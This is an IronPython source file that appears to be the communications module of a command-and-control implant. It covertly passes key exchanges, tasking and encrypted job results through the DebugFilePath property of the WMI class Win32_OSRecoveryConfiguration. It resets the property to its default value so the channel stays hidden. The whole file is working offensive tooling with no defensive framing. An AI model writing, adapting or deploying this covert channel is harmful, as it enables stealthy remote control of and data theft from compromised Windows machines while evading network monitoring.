from System.Management import ManagementClass
from System import Convert


class WMI(object):
    def read(self):
        wmi_cls = ManagementClass('Win32_OSRecoveryConfiguration')
        instance = wmi_cls.GetInstances()
        for record in instance:
            return record["DebugFilePath"]

    def write(self, data="%SystemRoot%\\MEMORY.DMP"):
        wmi_cls = ManagementClass('Win32_OSRecoveryConfiguration')
        instance = wmi_cls.GetInstances()
        for record in instance:
            record["DebugFilePath"] = data
            record.Put()


class Comms(Serializable):
    def __init__(self, client):
        self.client = client
        self.crypto = None
        self.wmi = WMI()

        # Listener URLs
        #self.base_url = URL  # This needs to be a tuple of callback domains (eventually)
        #self.jobs_url = Uri(urljoin(self.base_url, 'jobs'))

    def key_exchange(self):
        while True:
            try:
                value = self.wmi.read()
                if value == "%SystemRoot%\\MEMORY.DMP":
                    print "Writing kex"
                    self.crypto = Crypto()
                    pub_key = Convert.ToBase64String(Encoding.UTF8.GetBytes(self.crypto.public_key))
                    self.wmi.write("{}:kex:client:{}".format(self.client.GUID, pub_key))
                    break

                print "key_exchange(): Waiting for default attribute value"
            except Exception as e:
                if DEBUG:
                    print "Error performing key exchange: " + str(e)
                    print_traceback()

            Thread.Sleep(self.client.SLEEP)

        while True:
            try:
                value = self.wmi.read()
                if value != "%SystemRoot%\\MEMORY.DMP":
                    GUID, op, creator, data = value.split(":")
                    if GUID == str(self.client.GUID) and op == "kex" and creator == "server":
                        print "Reading kex"
                        server_pubkey = Encoding.UTF8.GetString(Convert.FromBase64String(data))
                        self.crypto.derive_key(server_pubkey)
                        self.wmi.write()
                        return
                print "key_exchange(): Waiting for server kex"
            except Exception as e:
                if DEBUG:
                    print "Error performing key exchange: " + str(e)
                    print_traceback()   

            Thread.Sleep(self.client.SLEEP)

    def send_job_results(self, results, job_id):
        self.key_exchange()

        if type(results) == dict:
            results = JavaScriptSerializer().Serialize(results)
        elif hasattr(results, '__serialize__'):
            results = JavaScriptSerializer().Serialize(results.__serialize__())

        encrypted_results = self.crypto.Encrypt(results)
        encoded_results = Convert.ToBase64String(encrypted_results)

        while True:
            try:
                print "Writing Job results"
                self.wmi.write("{}:job_results|{}:client:{}".format(self.client.GUID, job_id, encoded_results))
                return
            except Exception as e:
                if DEBUG:
                    print "Error performing sending job results: " + str(e)
                    print_traceback()

            Thread.Sleep(self.client.SLEEP)

    def get_job(self):
        self.key_exchange()

        while True:
            try:
                value = self.wmi.read()
                if value == "%SystemRoot%\\MEMORY.DMP":
                    print "Requesting Job"
                    self.wmi.write("{}:jobs:client:gimme".format(self.client.GUID))
                    break
                print "get_job(): Waiting for default attribute value"
            except Exception as e:
                if DEBUG:
                    print "Error performing getting jobs: " + str(e)
                    print_traceback()

            Thread.Sleep(self.client.SLEEP)

        while True:
            try:
                print "Getting Job"
                value = self.wmi.read()
                if value != "%SystemRoot%\\MEMORY.DMP":
                    GUID, op, creator, data = value.split(":")
                    if GUID == str(self.client.GUID) and op == "jobs" and creator == "server":
                        self.wmi.write()
                        if len(data):
                            job = Convert.FromBase64String(data)
                            return JavaScriptSerializer().DeserializeObject(
                                Encoding.UTF8.GetString(self.crypto.Decrypt(job))
                            )
                        return
            except Exception as e:
                if DEBUG:
                    print "Error performing getting jobs: " + str(e)
                    print_traceback()

            Thread.Sleep(self.client.SLEEP)

    def __str__(self):
        return 'wmi'

    def __serialize__(self):
        return self.__str__()
